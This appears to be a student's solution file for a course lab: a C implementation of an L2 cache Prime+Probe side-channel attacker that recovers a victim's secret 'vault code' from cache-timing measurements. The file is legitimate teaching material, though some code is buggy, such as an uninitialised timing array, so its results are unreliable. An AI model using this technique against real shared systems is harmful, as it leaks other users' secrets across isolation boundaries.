/**
 * 
 * CMU 15-793 Security for Secure Computer Systems Spring 2024
 *
 *  thief.c is the attacker implementation. You need to add the code for 
 *  prime_probe_l2_set_new()
 * 
 */

#include "util.h"
#include "params.h"
#include <sys/mman.h>
#include "cache.h"
#include "linked_list.h"
#include <time.h>
#include <string.h>

void printBinary(uint64_t num) {
  for (int i = 63; i >= 0; i--) {
    putchar((num & ((uint64_t)1 << i)) ? '1' : '0');
    if (i % 8 == 0) {
      putchar(' ');
    }
  }
  putchar('\n');
}

// you will need to generate an eviction linked list structure with next,
// previous pointers and time measurements
// then you can use the shuffle function to randomize the access pattern 
// and avoid prefetchers being activated
// then traverse the list for prime and probe
// you might want to consider adding some delay between steps
// finally you need to traverse the list one more time to retrieve 
// the time measurements
bool prime_probe_l2_set(int set, char *buf, cache_set* curr) {
  bool found = false;
  uint64_t addr = (uint64_t) (buf + (set * L2_WAYS * L2_LINE_SIZE));
  uint32_t timing;
  uint64_t lineAddr;
  uint64_t start=0, end =0;
//  uint64_t weighted_avg;
//  for (int i = 0; i < L2_WAYS; i++) {
    // Set the first byte of each line to 1
//    lineAddr = addr + i * L2_LINE_SIZE;
  serialize();
  start = rdtsc();
  measure_line_access_time(addr);
  mfence();
  end = rdtscp();
  serialize();
  timing = end - start;
    if (set == 992 || set == 209 || set == 63) {
      printf("Address = %ld, set %d  timing = %d \n", lineAddr, set, timing);
    }

    if(timing > 30){
      found = true;
    }
//  }

  return found;
}

void wait_and_yield(const struct timespec *duration) {
  nanosleep(duration, NULL);
}


int main(int argc, char const *argv[]) {
  int verbose = 0; // Default value for verbose is 0
  int printing_sum_cycle = 0; // Default value for printing is 0
  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "-v") == 0) {
      verbose = 1; // Set verbose to 1 if "-v" is found
    }
    if (strcmp(argv[i], "-p") == 0) {
      printing_sum_cycle = 1; // Set printing_sum_cycle to 1 if "-p" is found
    }
  }
  void *buf = NULL;
  int buf_size = 1 << 21;
  if (posix_memalign(&buf, 1 << 21, buf_size)) { // Allocates 2MB aligned memory, begins at 0x200000
    perror("posix_memalign");
  }
  madvise(buf, buf_size, MADV_HUGEPAGE);
  *((uint64_t *)buf) = 5;

  int evict_count[L2_SETS];
  int sum_cycle[L2_SETS];
  for (int i = 0; i < L2_SETS; i++) {
    evict_count[i] = 0;
  }

  cache_set* cache_head = setup_cache(L2_WAYS, L2_SETS, buf);
  cache_set* curr = cache_head;

  struct timespec duration;
  duration.tv_sec = 0;  // seconds
  duration.tv_nsec = 500;  // nanoseconds
  struct timespec lduration;
  lduration.tv_sec = 0;  // seconds
  lduration.tv_nsec = 1000000;  // nanoseconds

  printf("L2_WAYS = %d\n", L2_WAYS);
  printf("L2_SETS = %d\n", L2_SETS);
  printf("L2_LINE_SIZE = %d\n", L2_LINE_SIZE);
  int num_reps = 3;
  for (int rep = 0; rep < num_reps; rep++) {
    printf("\rL2 Prime+Probe Progress: %4d/%4d", rep+1, num_reps);
    fflush(stdout);

    scramble_and_clear_cache(cache_head, L2_WAYS, L2_SETS, buf);

    cache_set* curr2 = cache_head;
    for (int f=0 ; f< L2_SETS ; f++) {
      prime_cache( curr2,buf);

      curr2 = curr2->next;
    }
    curr = cache_head;
    for (int i=0 ; i< L2_SETS ; i++) {
      uintptr_t address =curr->lineAddr; // Example address
      uintptr_t maskedAndShifted = (address >> 6) & 0x7FF;
      probe_cache( curr,buf);
      wait_and_yield(&duration);
      probe_cache( curr,buf);
      sum_cycle[maskedAndShifted] += curr->timing;
      if(curr->timing> 60){
        evict_count[maskedAndShifted]++;
      }
      curr = curr->next;
    }
    curr = cache_head;

  }
  printf("\n");

  curr = cache_head;
  for (int i=0 ; i< L2_SETS ; i++) {
    if(verbose)
      printf(" timing = %4d set %4d  avg %4d\n", i,curr->setNum,sum_cycle[i]/num_reps);
    if (printing_sum_cycle)
      printf("%d, %d\n", i, sum_cycle[i]);

    if (sum_cycle[i]/num_reps>50) {
      uintptr_t address =curr->lineAddr; // Example address
      uintptr_t maskedAndShifted = (address >> 6) & 0x7FF;
      if(verbose) {
        printf("Original address: 0x%lx\n", address);
        printf("Extracted bits: %ld\n", maskedAndShifted);
      }

      evict_count[i]++; // another eviction voting for average.
    }
    curr = curr->next;
  }

  free_cache(cache_head);

  int max_val = 0;
  int max_set = -1;
  for (int set = 0; set < L2_SETS; set++) {
    uint64_t addr = (uint64_t) (buf + (set * L2_WAYS * L2_LINE_SIZE));

    if (evict_count[set] > max_val) {
      max_val = evict_count[set];
      max_set = set;
      uint64_t addr = (uint64_t) (buf + (set * L2_WAYS * L2_LINE_SIZE));
      if (verbose){
        printBinary(addr);
        printf(" set number = %4d , evict_count = %4d\n", set, evict_count[set]);
      }
    }
  }
  printf("Vault code: %d (%d)\n", max_set, max_val);
}
